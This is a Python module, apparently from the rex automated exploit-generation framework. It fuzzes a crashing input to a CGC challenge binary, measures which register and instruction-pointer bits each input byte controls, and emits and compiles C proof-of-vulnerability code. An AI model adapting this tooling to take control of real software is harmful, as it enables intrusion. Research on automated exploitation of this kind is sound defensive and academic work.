import random
import logging
import tempfile
from collections import defaultdict
from multiprocessing import Pool

from povsim import CGCPovSimulator
import angr
import tracer
import compilerex

from . import fuzzing_type_1_c_template

l = logging.getLogger("rex.fuzzing_type_1")
logging.getLogger("tracer.qemu_runner").setLevel("WARNING")
logging.getLogger("cle.elfcore").setLevel("CRITICAL")
l.setLevel("DEBUG")


NUM_CGC_BITS = 20
CGC_GENERAL_REGS = ["eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"]
_PREFILTER_BYTES = {"0", "1", "A", "B", "\xff", "\x00"}
_PREFILTER_BYTES.update(chr(random.randint(0, 255)) for _ in range(10))
_PREFILTER_BYTES = set(ord(c) for c in _PREFILTER_BYTES)


class ByteAnalysis(object):
    def __init__(self):
        self.valid_bytes = set()
        self.bytes_that_dont_crash = set()
        self.bytes_that_cause_diff_crash = set()
        self.bytes_that_change_registers = set()
        self.register_pattern_maps = dict()
        self.register_bitmasks = dict()
        self.is_complex = False


class NumberStr(object):
    def __init__(self, min_len, max_len, start_idx, end_idx, max_val, base):
        self.min_len = min_len
        self.max_len = max_len
        self.start_idx = start_idx
        self.end_idx = end_idx
        self.base = base
        self.max_val = max_val


class CrashFuzzerException(Exception):
    pass


class ComplexAnalysisException(CrashFuzzerException):
    pass


# TODO handle timeouts
# TODO move to it's own project?
# TODO make this fast bprm->core_dump
# TODO rewrite to construct payload in sections of sends or at least where things need to be changed
# have qemu write to stderr?
def _get_reg_vals(binary_input_byte):
    binary, test_input, c = binary_input_byte
    r = tracer.QEMURunner(binary, input=test_input, record_core=True)
    if not r.crash_mode:
        return [c, None]
    else:
        reg_vals = dict()
        for reg in CGC_GENERAL_REGS + ["eip"]:
            reg_vals[reg] = r.reg_vals[reg]
        return [c, r.reg_vals]


# TODO Make sure we only look at general registers that cgc accepts
# TODO we assume the input is constant length ie random/flag page has no effect on it
class Type1CrashFuzzer(object):
    def __init__(self, binary, crash=None):
        """
        :param binary: path to the binary which crashed
        :param crash: string of input which crashed the binary
        """

        self.binary = binary
        self.crash = crash

        # verify it actually crashes the binary
        r = tracer.QEMURunner(self.binary, input=self.crash, record_core=True)
        if not r.crash_mode:
            raise CrashFuzzerException("input did not crash the binary")

        self._p = angr.Project(self.binary)

        self.orig_regs = r.reg_vals

        self.pool = None
        self.byte_analysis = dict()
        self._bases = dict()
        self.skip_bytes = set()
        self.skip_sets = set()
        self.regs_to_numbers = dict()
        self.used_bytes = set()
        self.byte_translation_funcs = list()
        self.byte_translation_calls = dict()
        self._bit_patterns = dict()

        self.make_bases()
        self.run()

    def make_bases(self):
        for base in range(2, 20):
            accepted_chars = set()
            accepted_chars.update(chr(i+ord("0")) for i in range(0, min(base, 10)))
            if base > 10:
                for i in range(10, base):
                    accepted_chars.add(chr(ord("a")+i-10))
                    accepted_chars.add(chr(ord("A")+i-10))
            self._bases[base] = accepted_chars

    def run(self):
        self.pool = Pool(processes=8)
        # for each byte of input we will try all possible characters and determine how they change bits in the registers
        for i in range(0, len(self.crash)):
            interesting = self.analyze_bytes([i])
            if not interesting:
                interesting = self.check_for_multiple(i)
            if interesting and self.exploitable():
                break
        self.pool.close()

    @staticmethod
    def _replace_indices(s, c, indices):
        for i in indices:
            s = s[:i] + bytes([c]) + s[i+1:]
        return s

    @staticmethod
    def _replace_indices_len(s, to_rep, len_to_remove, indices):
        for i in indices:
            s = s[:i] + to_rep + s[i+len_to_remove:]
        return s

    def _get_bit_patterns(self, number_bits, bit_indices):
        bit_indices = tuple(sorted(bit_indices))
        if (number_bits, bit_indices) in self._bit_patterns:
            return set(self._bit_patterns[(number_bits, bit_indices)])
        all_patterns = set()
        for i in range(2 ** number_bits):
            pattern = 0
            for n, index in enumerate(bit_indices):
                if (1 << n) & i != 0:
                    pattern |= (1 << index)

            all_patterns.add(pattern)
        self._bit_patterns[(number_bits, bit_indices)] = set(all_patterns)
        return all_patterns

    def analyze_bytes(self, byte_indices):
        if any(i in self.skip_bytes for i in byte_indices):
            return False
        if frozenset(set(byte_indices)) in self.skip_sets:
            return False
        if len(byte_indices) == 1:
            l.info("fuzzing byte %d", byte_indices[0])
        else:
            l.info("fuzzing bytes %s", byte_indices)
        bytes_to_regs = dict()

        bytes_that_change_crash = set()
        bytes_that_dont_crash = set()
        bytes_that_dont_affect_regs = set()
        bytes_that_affect_regs = set()

        # run on the prefilter
        binary_input_bytes = []
        for i in _PREFILTER_BYTES:
            test_input = self._replace_indices(self.crash, i, byte_indices)
            binary_input_bytes.append((self.binary, test_input, chr(i)))
        it = self.pool.imap_unordered(_get_reg_vals, binary_input_bytes)
        for c, reg_vals in it:
            if reg_vals is not None:
                bytes_to_regs[c] = reg_vals
            else:
                bytes_that_dont_crash.add(c)
        for c in sorted(bytes_to_regs.keys()):
            reg_vals = bytes_to_regs[c]
            num_diff = 0
            for r in reg_vals.keys():
                if reg_vals[r] != self.orig_regs[r]:
                    num_diff += 1

            if num_diff == 0:
                bytes_that_dont_affect_regs.add(c)
            elif num_diff > 2 and reg_vals["eip"] != self.orig_regs["eip"]:
                bytes_that_change_crash.add(c)
            else:
                bytes_that_affect_regs.add(c)
        if len(bytes_that_affect_regs) == 0:
            return False

        for i in range(256):
            if i in _PREFILTER_BYTES:
                continue
            test_input = self._replace_indices(self.crash, i, byte_indices)
            binary_input_bytes.append((self.binary, test_input, chr(i)))
        it = self.pool.imap_unordered(_get_reg_vals, binary_input_bytes, chunksize=4)
        for c, reg_vals in it:
            if reg_vals is not None:
                bytes_to_regs[c] = reg_vals
            else:
                bytes_that_dont_crash.add(c)

        ip_counts = defaultdict(int)
        for reg_vals in bytes_to_regs.values():
            ip_counts[reg_vals["eip"]] += 1

        # if multiple registers change we might've found a different crash
        for c in sorted(bytes_to_regs.keys()):
            reg_vals = bytes_to_regs[c]
            num_diff = 0
            for r in reg_vals.keys():
                if reg_vals[r] != self.orig_regs[r]:
                    num_diff += 1

            if num_diff == 0:
                bytes_that_dont_affect_regs.add(c)
            elif num_diff > 2 and reg_vals["eip"] != self.orig_regs["eip"]:
                bytes_that_change_crash.add(c)
            else:
                bytes_that_affect_regs.add(c)

        l.debug("%d bytes don't crash, %d bytes don't affect regs",
                len(bytes_that_dont_crash), len(bytes_that_dont_affect_regs))

        # the goal here is to find which bits of regs are contolled here
        all_reg_vals = defaultdict(set)
        for c in bytes_that_affect_regs:
            reg_vals = bytes_to_regs[c]
            for reg in reg_vals.keys():
                all_reg_vals[reg].add(reg_vals[reg])

        byte_analysis = ByteAnalysis()
        for i in byte_indices:
            self.byte_analysis[i] = byte_analysis
        byte_analysis.valid_bytes = set(bytes_to_regs.keys())

        found_interesting = False

        for reg in all_reg_vals.keys():
            possible_vals = all_reg_vals[reg]
            bits_that_can_be_set = 0
            bits_that_can_be_unset = 0
            for val in possible_vals:
                bits_that_can_be_set |= val
                bits_that_can_be_unset |= ((~val) & 0xffffffff)
            controlled_bits = bits_that_can_be_set & bits_that_can_be_unset
            while controlled_bits != 0:
                number_bits = bin(controlled_bits).count("1")
                bit_indices = []
                for i, c in enumerate(bin(controlled_bits).replace("0b", "").rjust(32, "0")):
                    if c == "1":
                        bit_indices.append(31-i)
                if number_bits > 8:
                    if self.analyze_complex(byte_indices, reg, bytes_to_regs):
                        return True
                    else:
                        return False

                # might want to check for impossible bit patterns
                if controlled_bits != 0:
                    # check that all bitmasks are possible for those bits

                    # now map the patterns were not possible
                    all_patterns = self._get_bit_patterns(number_bits, bit_indices)

                    byte_analysis.register_pattern_maps[reg] = dict()

                    impossible_patterns = set(all_patterns)
                    for c in bytes_to_regs.keys():
                        reg_val = bytes_to_regs[c][reg]
                        pattern = reg_val & controlled_bits
                        byte_analysis.register_pattern_maps[reg][pattern] = c
                        impossible_patterns.discard(pattern)

                    # now we want to find a minimum set of bits
                    if len(impossible_patterns) > 0:
                        l.warning("not all patterns viable, decreasing bit patterns")
                        # remove a bit with the least variety
                        possible_patterns = all_patterns - impossible_patterns
                        bit_counts = dict()
                        for bit in bit_indices:
                            bit_counts[bit] = 0
                        for pattern in possible_patterns:
                            for bit in bit_indices:
                                if pattern & (1 << bit) != 0:
                                    bit_counts[bit] += 1
                                else:
                                    bit_counts[bit] -= 1
                        bit_to_remove = max(bit_counts.items(), key=lambda x: abs(x[1]))[0]
                        l.info("removing bit %d", bit_to_remove)
                        controlled_bits &= (~(1 << bit_to_remove))
                    else:
                        break

            if controlled_bits != 0:
                l.info("Register %s has the following bitmask %s for bytes %s of the input",
                       reg, hex(controlled_bits), byte_indices)
                byte_analysis.register_bitmasks[reg] = controlled_bits
                found_interesting = True

        if len(byte_analysis.register_bitmasks) > 1 and "eip" in byte_analysis.register_bitmasks:
            if bin(self._reg_bits_controlled("eip")).count("1") \
                    - bin(byte_analysis.register_bitmasks['eip']).count('1') > NUM_CGC_BITS:
                del byte_analysis.register_bitmasks['eip']
            else:
                for reg in dict(byte_analysis.register_bitmasks):
                    if reg != "eip":
                        l.debug("removing reg %s as it conflicts with eip", reg)
                        del(byte_analysis.register_bitmasks[reg])

        return found_interesting

    def check_for_multiple(self, byte_index):
        found_interesting = False
        # we will look for if the same pattern has to be somewhere else in the payload
        substr = self.crash[byte_index:byte_index+3]
        if len(substr) > 2 and self.crash.count(substr) > 1:
            all_starts = list(self._str_find_all(self.crash, substr))
            if len(all_starts) == 1:
                return
            strs = [self.crash[i:] for i in all_starts]
            common_len = len(self._longest_common_prefix(strs))
            for i in range(common_len):
                found_interesting = self.analyze_bytes([start+i for start in all_starts])
                if not found_interesting:
                    for j in range(i, common_len):
                        self.skip_sets.add(frozenset(start + j for start in all_starts))
                    break
                else:
                    self.skip_bytes.update(start + i for start in all_starts)
        return found_interesting

    @staticmethod
    def _str_find_all(a_str, sub):
        start = 0
        while True:
            start = a_str.find(sub, start)
            if start == -1:
                return
            yield start
            start += 1

    @staticmethod
    def _longest_common_prefix(strs):
        common_prefix = ""
        for i in zip(*strs):
            if i.count(i[0]) == len(i):
                common_prefix += i[0]
            else:
                break
        return common_prefix

    def read_int(self, s, base, max_len):
        accepted_chars = self._bases[base]
        end = 0
        while end < min(len(s), max_len) and s[end] in accepted_chars:
            end += 1

        if end == 0:
            return None
        else:
            return int(s[:end], base) & 0xffffffff

    def analyze_complex(self, byte_indices, reg, bytes_to_regs):
        # returns whether or not the analyses found something

        # do some checks
        votes = defaultdict(int)
        remainder = self._longest_common_prefix([self.crash[i+1:] for i in byte_indices])
        for c in bytes_to_regs:
            expected = bytes_to_regs[c][reg]
            s = c + remainder
            for base in range(2, 20):
                for max_len in range(2, 20):
                    if self.read_int(s, base, max_len) == expected:
                        votes[(base, max_len)] += 1
                        break

        if len(votes) == 0:
            l.warning("unknown complex byte")
            return False
        base, current_len = max(votes.keys(), key=lambda x: votes[x])
        l.debug("chose base %d with max len %d", base, current_len)

        # now we need to decide if we can actually change the length of the integer
        max_working = current_len
        min_working = current_len
        for i in range(1, current_len + 10):
            test_input = self._replace_indices_len(self.crash, b"1"*i, current_len, byte_indices)
            expected = int("1"*i, base) & 0xffffffff
            reg_vals = _get_reg_vals((self.binary, test_input, 0))[1]
            if reg_vals is None or reg_vals[reg] != expected:
                pass
            else:
                max_working = max(max_working, i)
                min_working = min(min_working, i)
        l.debug("Decided that input length has a min of %d and a max of %d", min_working, max_working)
        l.debug("Currently starts at index %d and ends at index %d", byte_indices[0], byte_indices[0]+current_len)
        if len(byte_indices) > 1:
            l.debug("Multiple copies of the int str at indices %s", byte_indices)

        # now we set up what's needed
        for i in byte_indices:
            self.skip_bytes.update(range(i, i+current_len))
        max_val = min(base**(max_working+1)-1, 0x7fffffff)
        if max_val < int("1"*NUM_CGC_BITS, 2):
            l.warning("max_val too small to use as a type1")
            return False

        l.debug("found atoi for reg %s at byte_indices %s", reg, byte_indices)

        self.regs_to_numbers[reg] = set()
        for i in byte_indices:
            num_str = NumberStr(min_working, max_working, i, i + current_len, max_val, base)
            self.regs_to_numbers[reg].add(num_str)
        return True

    def _reg_bits_controlled(self, reg):
        if reg in self.regs_to_numbers:
            return 0xffffffff
        reg_bitmasks = defaultdict(int)
        for byte_analysis in self.byte_analysis.values():
            if reg in byte_analysis.register_bitmasks:
                reg_bitmasks[reg] |= byte_analysis.register_bitmasks[reg]

        return reg_bitmasks[reg]

    def _reg_is_controlled(self, reg):
        if reg in self.regs_to_numbers:
            return True

        reg_bitmasks = defaultdict(int)
        for byte_analysis in self.byte_analysis.values():
            if reg in byte_analysis:
                reg_bitmasks[reg] |= byte_analysis.register_bitmasks[reg]

        if bin(reg_bitmasks[reg]).count("1") >= NUM_CGC_BITS:
            return True

        return False

    def exploitable(self):
        reg_bitmasks = defaultdict(int)
        for byte_analysis in self.byte_analysis.values():
            for r in byte_analysis.register_bitmasks:
                reg_bitmasks[r] |= byte_analysis.register_bitmasks[r]

        if bin(reg_bitmasks["eip"]).count("1") < NUM_CGC_BITS and "eip" not in self.regs_to_numbers:
            return False

        for r in reg_bitmasks:
            if r == "eip":
                continue
            if bin(reg_bitmasks[r]).count("1") >= NUM_CGC_BITS:
                return True

        if any(r in self.regs_to_numbers for r in CGC_GENERAL_REGS):
            return True

        return False

    def _create_translation_c(self, register):
        # use the other function if needed
        if register in self.regs_to_numbers:
            for num_obj in self.regs_to_numbers[register]:
                return self._create_translation_c_number(register, num_obj)

        # create the bit_pattern table
        # then we inject the bit pattern translation table into the c
        for i, byte_analysis in self.byte_analysis.items():
            if register in byte_analysis.register_bitmasks and byte_analysis.register_bitmasks[register] != 0:
                # now get the bits
                reg_map = byte_analysis.register_pattern_maps[register]
                collapsed_map = dict()
                for pattern, c in reg_map.items():
                    collapsed = self.collapse_bits(pattern, byte_analysis.register_bitmasks[register])
                    collapsed_map[collapsed] = c

                # now make the c table
                table_name = "reg_byte_%d_table" % i
                translation_table = "char " + table_name + "[] = {"
                num_bits = bin(byte_analysis.register_bitmasks[register]).count("1")
                for j in range(2**num_bits):
                    if j in collapsed_map:
                        translation_table += hex(ord(collapsed_map[j])) + ", "
                    else:
                        raise CrashFuzzerException()
                # remove last ", " and add }
                translation_table = translation_table[:-2] + "};\n"

                preamble = """\
// function to change a particular byte, returns the number of bytes it added to buf
int translate_byte_%#x(char *payload_p, int reg_%s) {
    char new_char;
    int reg_val = reg_%s;
    int key_val;\n\n""" % (i, register, register)

                code = """\
    key_val = collapse_bits(reg_val, %#x);
    new_char = %s[key_val];
    *payload_p = new_char;\n""" % (byte_analysis.register_bitmasks[register], table_name)

                epilogue = """\
    // we only added one byte to the payload
    return 1;
}"""

                which_reg = "t1vals.ipval" if register == "eip" else "t1vals.regval"
                call = """\
translate_byte_%#x(curr, %s);
""" % (i, which_reg)

                # now create the translation code
                self.byte_translation_funcs.append(preamble + translation_table + code + epilogue)
                self.byte_translation_calls[i] = call

                # add the byte to the used bytes
                self.used_bytes.add(i)

    def _create_translation_c_number(self, register, num_obj):
        code = """\
// function to change a particular byte by int_to_str, returns the number of bytes it added to buf
int translate_byte_%#x(char *payload_p, int reg_%s) {
    int reg_val = reg_%s;
    int base = %d;
    int min_len = %d;
    char replace_str[40];

    // reduce the reg_val to the requested
    reg_val &= %#x;

    // convert the int to a string
    int_to_str(reg_val, base, replace_str);
    int len = strlen(replace_str);

    // pad to the min_len with 0's
    int pad = 0;
    while (len + pad < min_len) {
        *payload_p++ = '0';
    }

    // add to payload
    memcpy(payload_p, replace_str, len);

    // return the number of bytes added
    return len+pad;
}""" % (num_obj.start_idx, register, register, num_obj.base, num_obj.min_len, num_obj.max_val)

        # mark all the bytes as used
        for i in range(num_obj.start_idx, num_obj.end_idx):
            self.used_bytes.add(i)

        which_reg = "t1vals.ipval" if register == "eip" else "t1vals.regval"
        call = """\
translate_byte_%#x(curr, %s);
""" % (num_obj.start_idx, which_reg)

        # now create the translation code
        self.byte_translation_funcs.append(code)
        self.byte_translation_calls[num_obj.start_idx] = call

    def _create_copy_bytes_code(self, start, end):
        code = """\
// function to copy bytes to the payload_buf
int translate_byte_%#x(char *payload_p, const char *orig) {
    int start = %d;
    int end = %d;

    int len = end - start;

    // add to payload
    memcpy(payload_p, orig + start, len);

    // return the number of bytes added
    return len;
}""" % (start, start, end)

        call = """\
translate_byte_%#x(curr, orig);
""" % start
        self.byte_translation_funcs.append(code)
        self.byte_translation_calls[start] = call
        self.used_bytes.add(start)

    def create_payload_construction(self):
        payload_len = len(self.crash)
        curr = 0
        sorted_used = sorted(self.used_bytes)
        for i in sorted_used:
            if i - curr > 0:
                self._create_copy_bytes_code(curr, i)
            curr = i+1
        if payload_len-curr > 0:
            self._create_copy_bytes_code(curr, payload_len)

        calls = []
        for i in sorted(self.byte_translation_calls):
            calls.append(self.byte_translation_calls[i])
        res = ""
        for call in calls:
            res += "\n  curr += " + call
        return res

    def dump_c(self, filename=None):
        if not self.exploitable():
            raise CrashFuzzerException("Not exploitable")

        self.used_bytes = set()

        # pick register/bitmask
        reg_bitmasks = defaultdict(int)
        for byte_analysis in self.byte_analysis.values():
            for r in byte_analysis.register_bitmasks:
                reg_bitmasks[r] |= byte_analysis.register_bitmasks[r]

        general_reg = None
        for r in reg_bitmasks:
            if r == "eip":
                continue
            if bin(reg_bitmasks[r]).count("1") >= NUM_CGC_BITS:
                general_reg = r
                break

        if general_reg is None:
            for r in CGC_GENERAL_REGS:
                if r in self.regs_to_numbers:
                    general_reg = self.regs_to_numbers.keys()[0]
                    reg_bitmasks[general_reg] = list(self.regs_to_numbers[general_reg])[0].max_val

        if "eip" in self.regs_to_numbers:
            reg_bitmasks["eip"] = list(self.regs_to_numbers["eip"])[0].max_val

        # general reg should be non-None
        if general_reg is None:
            raise CrashFuzzerException("Must be a bug, it was 'exploitable' but we can't find a register to set")

        self.byte_translation_funcs = list()
        self._create_translation_c(general_reg)
        self._create_translation_c("eip")

        # create the code to build the payload
        payload_construction = self.create_payload_construction()

        encoded_payload = ""
        for c in self.crash:
            encoded_payload += "\\x%02x" % ord(c)
        fmt_args = dict()
        fmt_args["register"] = general_reg
        fmt_args["regmask"] = hex(reg_bitmasks[general_reg])
        fmt_args["ipmask"] = hex(reg_bitmasks["eip"])
        fmt_args["payload"] = encoded_payload
        fmt_args["payloadsize"] = str(len(self.crash))
        fmt_args["do_payload_construction"] = payload_construction
        fmt_args["byte_translation_funcs"] = "\n\n".join(self.byte_translation_funcs)

        c_code = fuzzing_type_1_c_template.c_template
        for k, v in fmt_args.items():
            c_code = c_code.replace("{%s}" % k, v)

        if filename is not None:
            with open(filename, 'w') as f:
                f.write(c_code)
        return c_code

    def dump_binary(self, filename=None):
        c_code = self.dump_c()
        compiled_result = compilerex.compile_from_string(c_code,
                                                         filename=filename)
        return compiled_result

    def test_binary(self):
        """
        Test the binary generated
        """

        # dump the binary code
        pov_binary_filename = tempfile.mktemp(dir='/tmp', prefix='rex-pov-')
        self.dump_binary(filename=pov_binary_filename)

        pov_tester = CGCPovSimulator()
        return pov_tester.test_binary_pov(pov_binary_filename, self.binary)

    @staticmethod
    def collapse_bits(val, mask):
        bit_index = 0
        out = 0
        for i in range(32):
            if mask & (1 << i) != 0:
                if val & (1 << i) != 0:
                    out |= (1 << bit_index)
                bit_index += 1
        return out
